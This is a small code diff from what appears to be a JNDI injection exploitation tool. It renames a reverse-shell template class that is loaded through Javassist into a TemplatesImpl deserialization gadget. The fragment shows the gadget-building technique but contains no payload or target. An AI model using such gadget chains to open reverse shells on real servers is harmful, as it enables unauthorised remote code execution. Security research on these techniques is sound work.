@@ -1,6 +1,6 @@
 package map.jndi.gadget;
 
-import map.jndi.template.ReverseShellTemplate;
+import map.jndi.template.ReverseShell;
 import map.jndi.util.MiscUtil;
 import map.jndi.util.ReflectUtil;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
@@ -41,7 +41,7 @@ public class Gadgets {
         TemplatesImpl templatesImpl = new TemplatesImpl();
         ClassPool pool = ClassPool.getDefault();
 
-        CtClass clazz = pool.get(ReverseShellTemplate.class.getName());
+        CtClass clazz = pool.get(ReverseShell.class.getName());
         CtClass superClazz = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
         clazz.setSuperclass(superClazz);
 
